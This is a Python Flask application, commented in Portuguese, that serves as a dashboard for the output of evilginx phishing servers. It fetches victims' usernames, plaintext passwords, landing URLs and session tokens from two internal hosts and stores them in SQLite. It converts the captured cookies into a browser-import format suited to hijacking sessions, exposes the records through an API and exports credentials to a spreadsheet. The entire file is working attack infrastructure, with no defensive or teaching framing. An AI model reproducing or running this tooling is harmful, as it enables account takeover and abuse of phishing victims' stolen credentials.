#!/usr/bin/env python3
"""
App unificado para consultar resultados de múltiplas instâncias evilginx.
Uso:
  python app.py                         # sobe TODAS as instâncias
  python app.py 153                     # sobe só a instância 153
  python app.py 176                     # sobe só a instância 176
"""
import sys
import os
import json
import sqlite3
import tempfile
import threading
from datetime import datetime, UTC

import requests
from flask import Flask, request, g, render_template, jsonify, send_file
from openpyxl import Workbook

# ---------- Instâncias configuradas ----------
INSTANCES = {
    "153": {
        "remote_url": "http://172.20.14.153:8080/get_json",
        "db_path": "cache_153.db",
        "port": 5004,
    },
    "176": {
        "remote_url": "http://172.20.14.176:8080/get_json",
        "db_path": "cache_176.db",
        "port": 5001,
    },
}

FETCH_TIMEOUT = int(os.environ.get('FETCH_TIMEOUT', '20'))
HOST = os.environ.get('HOST', '0.0.0.0')

# ---------- Cookie format converter ----------

def _get_ci(d, *keys, default=None):
    """Busca case-insensitive em dict."""
    for k in keys:
        for dk, dv in d.items():
            if dk.lower() == k.lower():
                return dv
    return default


def normalize_tokens(tokens):
    """Converte tokens do formato dict aninhado (por domínio) para array flat de cookie objects."""
    if isinstance(tokens, list):
        return tokens
    if not isinstance(tokens, dict):
        return []
    cookies = []
    for domain, domain_cookies in tokens.items():
        if not isinstance(domain_cookies, dict):
            continue
        for cookie_name, cookie_data in domain_cookies.items():
            if not isinstance(cookie_data, dict):
                continue

            exp = _get_ci(cookie_data, "expirationDate", "Expires", "expires")
            is_session = exp is None
            http_only = _get_ci(cookie_data, "httpOnly", "HttpOnly", default=False)
            same_site = _get_ci(cookie_data, "sameSite", "SameSite", default="no_restriction")
            secure = _get_ci(cookie_data, "secure", "Secure", default=True)
            path = _get_ci(cookie_data, "path", "Path", default="/")

            cookie = {
                "domain": domain,
                "hostOnly": not domain.startswith("."),
                "httpOnly": bool(http_only),
                "name": cookie_data.get("Name", cookie_name),
                "path": path,
                "sameSite": same_site,
                "secure": bool(secure),
                "session": is_session,
                "storeId": "0",
                "value": _get_ci(cookie_data, "Value", "value", default=""),
            }
            if not is_session:
                cookie["expirationDate"] = exp

            cookies.append(cookie)
    return cookies

# ---------- App factory ----------

def create_app(instance_id, config):
    remote_url = config["remote_url"]
    db_path = config["db_path"]

    app = Flask(__name__, template_folder="templates")
    app.config["DB_PATH"] = db_path
    app.config["REMOTE_URL"] = remote_url
    app.config["INSTANCE_ID"] = instance_id

    def get_db():
        db = getattr(g, '_database', None)
        if db is None:
            db = g._database = sqlite3.connect(db_path)
            db.row_factory = sqlite3.Row
        return db

    def init_db():
        db = sqlite3.connect(db_path)
        db.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY,
                username TEXT,
                password TEXT,
                landing_url TEXT,
                tokens TEXT,
                fetched_at TEXT
            )
        ''')
        db.commit()
        db.close()

    @app.teardown_appcontext
    def close_connection(exception):
        db = getattr(g, '_database', None)
        if db is not None:
            db.close()

    def full_sync():
        try:
            resp = requests.get(remote_url, timeout=FETCH_TIMEOUT)
        except Exception as e:
            return False, f'fetch-error: {e}'
        if resp.status_code != 200:
            return False, f'status-{resp.status_code}'

        try:
            remote_list = resp.json()
        except Exception as e:
            return False, f'json-error: {e}'

        if not isinstance(remote_list, list):
            if isinstance(remote_list, dict):
                remote_list = [remote_list]
            else:
                return False, 'unexpected-json-structure'

        remote_map = {}
        for u in remote_list:
            if "id" in u:
                remote_map[u["id"]] = u
        remote_ids = set(remote_map.keys())

        db = sqlite3.connect(db_path)
        try:
            cur = db.cursor()
            cur.execute("SELECT id FROM users")
            local_ids = {row[0] for row in cur.fetchall()}

            to_delete = local_ids - remote_ids
            if to_delete:
                cur.executemany("DELETE FROM users WHERE id = ?", [(i,) for i in to_delete])

            for uid, u in remote_map.items():
                cur.execute(
                    '''INSERT INTO users (id, username, password, landing_url, tokens, fetched_at)
                       VALUES (?, ?, ?, ?, ?, ?)
                       ON CONFLICT(id) DO UPDATE SET
                         username=excluded.username,
                         password=excluded.password,
                         landing_url=excluded.landing_url,
                         tokens=excluded.tokens,
                         fetched_at=excluded.fetched_at
                    ''',
                    (
                        u.get("id"),
                        u.get("username"),
                        u.get("password"),
                        u.get("landing_url"),
                        json.dumps(normalize_tokens(u.get("tokens", [])), ensure_ascii=False),
                        datetime.now(UTC).isoformat(),
                    )
                )
            db.commit()
        except Exception as e:
            return False, f'db-error: {e}'
        finally:
            db.close()

        return True, f"sync-ok: remote={len(remote_ids)} local={len(local_ids)} deleted={len(to_delete)}"

    # --- Routes ---

    @app.route('/api/refresh', methods=['POST'])
    def api_refresh():
        ok, msg = full_sync()
        return jsonify({'ok': ok, 'message': msg}), (200 if ok else 500)

    @app.route('/api/users', methods=['GET'])
    def api_users():
        db = get_db()
        cur = db.cursor()
        q_id = request.args.get('id')
        q_username = request.args.get('username')
        limit = int(request.args.get('limit') or 100)
        offset = int(request.args.get('offset') or 0)

        if q_id:
            try:
                q_id = int(q_id)
            except ValueError:
                return jsonify({'error': 'ID inválido'}), 400
            cur.execute('SELECT * FROM users WHERE id = ? LIMIT 1', (q_id,))
            row = cur.fetchone()
            if not row:
                return jsonify([])
            rowd = dict(row)
            rowd['tokens'] = json.loads(rowd['tokens'] or '[]')
            return jsonify([rowd])

        if q_username:
            cur.execute('SELECT * FROM users WHERE username LIKE ? ORDER BY id DESC LIMIT ? OFFSET ?',
                        (f'%{q_username}%', limit, offset))
        else:
            cur.execute('SELECT * FROM users ORDER BY id DESC LIMIT ? OFFSET ?', (limit, offset))

        rows = cur.fetchall()
        out = []
        for r in rows:
            rd = dict(r)
            rd['tokens'] = json.loads(rd['tokens'] or '[]')
            out.append(rd)
        return jsonify(out)

    @app.route('/api/export_xlsx', methods=['GET'])
    def export_xlsx():
        db = get_db()
        cur = db.cursor()
        q_id = request.args.get('id')
        q_username = request.args.get('username')
        limit = int(request.args.get('limit') or 1000)
        offset = int(request.args.get('offset') or 0)

        if q_id:
            try:
                q_id = int(q_id)
            except ValueError:
                return jsonify({'error': 'ID inválido'}), 400
            cur.execute('SELECT id, username, password, landing_url FROM users WHERE id = ? LIMIT 1', (q_id,))
        elif q_username:
            cur.execute('SELECT id, username, password, landing_url FROM users WHERE username LIKE ? ORDER BY id DESC LIMIT ? OFFSET ?',
                        (f'%{q_username}%', limit, offset))
        else:
            cur.execute('SELECT id, username, password, landing_url FROM users ORDER BY id DESC LIMIT ? OFFSET ?',
                        (limit, offset))

        rows = cur.fetchall()
        wb = Workbook()
        ws = wb.active
        ws.title = "Users"
        ws.append(["ID", "Username", "Password", "Landing URL"])
        for r in rows:
            ws.append([r["id"], r["username"], r["password"], r["landing_url"]])

        tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".xlsx")
        wb.save(tmp.name)
        tmp.flush()
        tmp.seek(0)
        return send_file(tmp.name, as_attachment=True, download_name="users_export.xlsx",
                         mimetype="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")

    @app.route('/api/users/<int:user_id>', methods=['DELETE'])
    def api_delete_user(user_id):
        db = get_db()
        cur = db.cursor()
        cur.execute('SELECT id FROM users WHERE id = ?', (user_id,))
        if not cur.fetchone():
            return jsonify({'error': 'Usuário não encontrado'}), 404
        cur.execute('DELETE FROM users WHERE id = ?', (user_id,))
        db.commit()
        return jsonify({'ok': True, 'message': f'Usuário {user_id} removido do cache'}), 200

    @app.route('/delete/cache', methods=['GET'])
    def delete_cache():
        try:
            if os.path.exists(db_path):
                os.remove(db_path)
            init_db()
            return jsonify({"status": "success", "message": f"{db_path} removido e recriado"}), 200
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500

    @app.route('/')
    def index():
        return render_template('index.html', remote=remote_url)

    init_db()
    return app


# ---------- Run ----------

def run_instance(instance_id, config):
    app = create_app(instance_id, config)
    print(f"[{instance_id}] port={config['port']}  remote={config['remote_url']}  db={config['db_path']}")
    app.run(host=HOST, port=config["port"], debug=False)


if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else 'all'

    if target in INSTANCES:
        run_instance(target, INSTANCES[target])
    elif target == 'all':
        threads = []
        for iid, cfg in INSTANCES.items():
            t = threading.Thread(target=run_instance, args=(iid, cfg), daemon=True)
            t.start()
            threads.append(t)
        labels = ', '.join(f'{k} -> :{v["port"]}' for k, v in INSTANCES.items())
        print(f"All instances: {labels}")
        for t in threads:
            t.join()
    else:
        print(f"Instância '{target}' não encontrada. Disponíveis: {', '.join(INSTANCES.keys())}")
        sys.exit(1)
